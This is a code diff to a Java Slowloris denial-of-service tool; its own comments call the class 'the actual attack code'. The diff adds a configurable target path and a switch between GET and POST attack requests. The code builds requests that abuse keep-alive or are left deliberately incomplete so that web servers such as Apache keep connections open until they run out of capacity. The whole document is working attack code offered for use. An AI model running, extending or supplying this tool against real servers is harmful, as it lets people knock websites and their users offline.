@@ -3,6 +3,7 @@ package SlowLoris;
 import java.io.*;
 import java.net.InetAddress;
 import java.net.Socket;
+import java.util.regex.Pattern;
 
 /**
  * Implements the actual attack code.
@@ -11,9 +12,11 @@ public class SlowLoris {
 
     // Primitive fields
     private String netAddr;
+    private String urlPath;
     private int port;
     private int numConnections;
     private boolean keepAliveAbuse;
+    private boolean useGetRequest;
 
     // Constants
     public static final int DEFAULT_CONNECTIONS = 10;
@@ -107,16 +110,25 @@ public class SlowLoris {
             // Otherwise, the connection is a success and we can now kill it.
             System.out.println("Successful connection #" + requestCount + "\n");
             try {
+                String attack;
+                // Generate either a POST or GET request.
+                if(useGetRequest) {
+                    // GET request
+                    attack = generateAttackString();
+                } else {
+                    // POST request
+                    attack = generatePostAttackString();
+                }
                 // Write the generated attack string to the server.
                 if(keepAliveAbuse) {
                     // By using println, we send a complete request with the Keep-Alive header enabled.
                     // This will result in a "K" in the server-status screen on the Apache server.
-                    out.println(generateAttackString());
+                    out.println(attack);
                 } else {
                     // This will result in a request that is missing a newline. The server will wait for
                     // the rest of the request to arrive, but it never will.
                     // This results in an "R" in the server-status screen on the Apache server.
-                    out.print(generateAttackString());
+                    out.print(attack);
                 }
                 // Flush the output to ensure that the entire request gets there.
                 out.flush();
@@ -192,7 +204,7 @@ public class SlowLoris {
      */
     private String generateAttackString() {
         String s;
-        s = "GET / HTTP/1.1\n";
+        s = "GET " + urlPath + " HTTP/1.1\n";
         s += "Host: " + netAddr + ":" + port + "\n";
         // This is the keep-alive header that makes the keep alive abuse function.
         s += "Connection: keep-alive\n";
@@ -212,7 +224,7 @@ public class SlowLoris {
      */
     private String generatePostAttackString() {
         String s;
-        s = "POST / HTTP/1.1\n";
+        s = "POST " + urlPath + " HTTP/1.1\n";
         s += "Host: " + netAddr + ":" + port + "\n";
         s += "Connection: keep-alive\n";
         s += "Content-Length: 21\n";
@@ -282,8 +294,8 @@ public class SlowLoris {
      * @param addr The new target URL or IP address
      */
     public void setNetAddr(String addr) {
-        if(addr != null && !addr.isEmpty()) {
-            this.netAddr = addr;
+        if(addr != null && !addr.trim().isEmpty()) {
+            this.netAddr = addr.trim();
         } else {
             this.netAddr = "";
         }
@@ -307,6 +319,42 @@ public class SlowLoris {
      */
     public int getPort() {
         return this.port;
+    }
+
+    /**
+     * Sets the urlPath that will be used in the attack request.
+     * @param urlPath The path used by the attack request.
+     */
+    public void setUrlPath(String urlPath) {
+        if(urlPath != null && !urlPath.trim().isEmpty()) {
+            this.urlPath = urlPath.trim();
+        } else {
+            this.urlPath = "/";
+        }
+    }
+
+    /**
+     * Retrieves the current target filepath for the attack.
+     * @return The current URL used by the attack request.
+     */
+    public String getUrlPath() {
+        return urlPath;
+    }
+
+    /**
+     * Sets whether to use GET or POST requests in the attack.
+     * @param useGetRequest True if GET requests should be used.
+     */
+    public void setUseGetRequest(boolean useGetRequest) {
+        this.useGetRequest = useGetRequest;
+    }
+
+    /**
+     * Retrieves whether the attack will use GET requests or not.
+     * @return True if GET requests will be used in the attack.
+     */
+    public boolean isUseGetRequest() {
+        return useGetRequest;
     }
 
     /**
